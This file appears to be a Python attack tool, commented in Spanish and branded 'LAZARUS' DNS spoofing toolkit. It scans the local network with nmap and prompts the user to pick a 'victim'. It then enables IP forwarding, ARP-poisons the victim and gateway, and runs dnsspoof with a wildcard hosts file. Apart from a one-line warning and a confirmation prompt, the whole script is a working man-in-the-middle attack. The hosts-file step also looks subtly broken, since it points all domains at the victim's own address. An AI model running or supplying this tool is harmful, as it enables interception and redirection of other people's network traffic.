#!/usr/bin/env python3

import subprocess
import re
import time
import signal
import sys
import os
import random

# ============================================
# CONFIGURACIÓN GLOBAL
# ============================================
INTERFACE = "eth0"
HOSTS_FILE = "/tmp/hosts.dnsspoof"
PROCESSES = []
KALI_IP = ""
GATEWAY_IP = ""
TARGET_IP = ""

# ============================================
# ESTILOS Y COLORES (EN ROJO)
# ============================================

RED = '\033[91m'
BRIGHT_RED = '\033[91;1m'
DARK_RED = '\033[31m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'
BOLD = '\033[1m'

def clear_screen():
    """Limpia la pantalla de la terminal."""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Muestra el banner principal de LAZARUS en rojo con el autor personalizado."""
    banner = f"""
{RED}
    ██╗      █████╗ ███████╗ █████╗ ██████╗ ██╗   ██╗███████╗
    ██║     ██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██║   ██║██╔════╝
    ██║     ███████║  ███╔╝ ███████║██████╔╝██║   ██║███████╗
    ██║     ██╔══██║ ███╔╝  ██╔══██║██╔══██╗██║   ██║╚════██║
    ███████╗██║  ██║███████╗██║  ██║██║  ██║╚██████╔╝███████║
    ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{RESET}
{RED}            ╔═══════════════════════════════════════╗
{RED}            ║     TOOLKIT v1.0 - DNS SPOOFING     ║
{RED}            ║          {BRIGHT_RED}by Joblaz7{RED}               ║
{RED}            ╚═══════════════════════════════════════╝
{RESET}
"""
    print(banner)

def animate_title():
    """Animación del título con efecto de parpadeo rojo."""
    clear_screen()
    lines = [
        "██╗      █████╗ ███████╗ █████╗ ██████╗ ██╗   ██╗███████╗",
        "██║     ██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██║   ██║██╔════╝",
        "██║     ███████║  ███╔╝ ███████║██████╔╝██║   ██║███████╗",
        "██║     ██╔══██║ ███╔╝  ██╔══██║██╔══██╗██║   ██║╚════██║",
        "███████╗██║  ██║███████╗██║  ██║██║  ██║╚██████╔╝███████║",
        "╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    ]
    
    for line in lines:
        for char in line:
            if random.random() > 0.7:
                sys.stdout.write(f"{BRIGHT_RED}{char}{RESET}")
            else:
                sys.stdout.write(f"{RED}{char}{RESET}")
            sys.stdout.flush()
            time.sleep(0.01)
        print()
        time.sleep(0.1)
    
    time.sleep(0.5)
    
    for _ in range(3):
        clear_screen()
        print_banner()
        time.sleep(0.5)
        clear_screen()
        print(f"{BRIGHT_RED}  LAZARUS v1.0  {RESET}")
        time.sleep(0.3)
    
    clear_screen()
    print_banner()

def print_status(message, end="\n"):
    print(f"{RED}[+]{RESET} {message}", end=end)
    sys.stdout.flush()

def print_error(message):
    print(f"{BRIGHT_RED}[-]{RESET} {message}")
    sys.stdout.flush()

def print_warning(message):
    print(f"{YELLOW}[!]{RESET} {message}")
    sys.stdout.flush()

def print_success(message):
    print(f"{DARK_RED}[✓]{RESET} {message}")
    sys.stdout.flush()

# ============================================
# FUNCIONES AUXILIARES
# ============================================

def run_command(command, background=False, silent=True):
    if background:
        full_command = f"{command} > /dev/null 2>&1"
        proc = subprocess.Popen(full_command, shell=True)
        PROCESSES.append(proc)
        return proc
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode != 0 and "No such process" not in result.stderr:
            print_error(f"Error: {result.stderr}")
        return result

def get_interface_ip(interface):
    try:
        result = subprocess.run(f"ip -4 addr show {interface}", shell=True, capture_output=True, text=True)
        match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', result.stdout)
        if match:
            return match.group(1)
        return None
    except:
        return None

def get_gateway_ip():
    try:
        result = subprocess.run("ip route | grep default", shell=True, capture_output=True, text=True)
        match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
        if match:
            return match.group(1)
        return None
    except:
        return None

def scan_network():
    print_status("Escaneando la red...")
    network = re.sub(r'\.\d+$', '.0/24', KALI_IP)
    try:
        result = subprocess.run(f"nmap -sn {network}", shell=True, capture_output=True, text=True)
        ips = re.findall(r'Nmap scan report for (\d+\.\d+\.\d+\.\d+)', result.stdout)
        ips = [ip for ip in ips if ip != KALI_IP]
        return ips
    except Exception as e:
        print_error(f"Error al escanear la red: {e}")
        return []

def show_targets(ips):
    print_status("IPs detectadas en la red:")
    print(f"{RED}   Nº  IP{RESET}")
    print(f"{RED}   ---  ----------------{RESET}")
    for i, ip in enumerate(ips, 1):
        print(f"   {RED}{i:2d}{RESET}  {BRIGHT_RED}{ip}{RESET}")
    print("")

def select_target(ips):
    while True:
        try:
            choice = input(f"{RED}[?]{RESET} Selecciona el número de la víctima: ")
            sys.stdout.flush()
            index = int(choice) - 1
            if 0 <= index < len(ips):
                return ips[index]
            print_error("Número fuera de rango. Intenta de nuevo.")
        except ValueError:
            print_error("Introduce un número válido.")

# ============================================
# FUNCIONES DEL ATAQUE
# ============================================

def enable_ip_forwarding():
    print_status("Habilitando IP forwarding...")
    run_command("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
    print_success("IP forwarding habilitado.")

def create_hosts_file():
    print_status(f"Creando archivo hosts en {HOSTS_FILE} con IP: {BRIGHT_RED}{TARGET_IP}{RESET}")
    with open(HOSTS_FILE, "w") as f:
        f.write(f"{TARGET_IP} *\n")
    print_success("Archivo hosts creado.")

def start_arpspoof():
    print_status(f"Iniciando ARP Spoofing a {BRIGHT_RED}{TARGET_IP}{RESET} (Gateway: {BRIGHT_RED}{GATEWAY_IP}{RESET})...")
    run_command(f"arpspoof -i {INTERFACE} -t {TARGET_IP} {GATEWAY_IP}", background=True)
    run_command(f"arpspoof -i {INTERFACE} -t {GATEWAY_IP} {TARGET_IP}", background=True)
    print_success("ARP Spoofing ejecutándose en segundo plano.")

def start_dnsspoof():
    print_status("Abriendo ventana xterm para logs DNS...")
    command = f"xterm -hold -bg black -fg red -geometry 100x30 -T 'LAZARUS - DNS Logs' -e sudo dnsspoof -i {INTERFACE} -f {HOSTS_FILE}"
    proc = subprocess.Popen(command, shell=True)
    PROCESSES.append(proc)
    print_success("Ventana de logs DNS abierta.")

def cleanup():
    print_status("Limpiando...")
    for proc in PROCESSES:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            proc.kill()
    if os.path.exists(HOSTS_FILE):
        os.remove(HOSTS_FILE)
    print_success("Limpieza completada.")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

# ============================================
# FUNCIÓN MAIN
# ============================================

def main():
    global KALI_IP, GATEWAY_IP, TARGET_IP, INTERFACE

    if os.geteuid() != 0:
        print_error("Este script necesita permisos de root.")
        print_warning("Ejecuta: sudo python3 script.py")
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)

    clear_screen()
    animate_title()
    time.sleep(1)

    print_status("Detectando configuración de red...")
    for iface in ["eth0", "wlan0"]:
        ip = get_interface_ip(iface)
        if ip:
            INTERFACE = iface
            KALI_IP = ip
            break

    if not KALI_IP:
        print_error("No se pudo detectar la IP de Kali.")
        sys.exit(1)

    GATEWAY_IP = get_gateway_ip()
    if not GATEWAY_IP:
        print_error("No se pudo detectar el gateway.")
        sys.exit(1)

    print_success(f"Kali IP: {BRIGHT_RED}{KALI_IP}{RESET}")
    print_success(f"Gateway IP: {BRIGHT_RED}{GATEWAY_IP}{RESET}")
    print_success(f"Interfaz: {BRIGHT_RED}{INTERFACE}{RESET}")

    ips = scan_network()

    if not ips:
        print_error("No se encontraron IPs en la red.")
        print_warning("Asegúrate de que la víctima esté encendida y conectada.")
        sys.exit(1)

    show_targets(ips)
    TARGET_IP = select_target(ips)
    print_success(f"Víctima seleccionada: {BRIGHT_RED}{TARGET_IP}{RESET}")

    print_warning("ATENCIÓN: Este ataque solo debe usarse en entornos controlados.")
    confirm = input(f"{RED}[?]{RESET} ¿Estás seguro de continuar? (s/N): ")
    sys.stdout.flush()
    if confirm.lower() != 's':
        print_status("Operación cancelada.")
        sys.exit(0)

    print_status("Preparando el ataque...")
    enable_ip_forwarding()
    create_hosts_file()
    start_arpspoof()

    time.sleep(2)

    start_dnsspoof()

    print_status("Ataque en curso. La terminal principal está libre.")
    print_status("Presiona Ctrl+C en la terminal principal para detener el ataque.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()
        sys.exit(0)

if __name__ == "__main__":
    main()



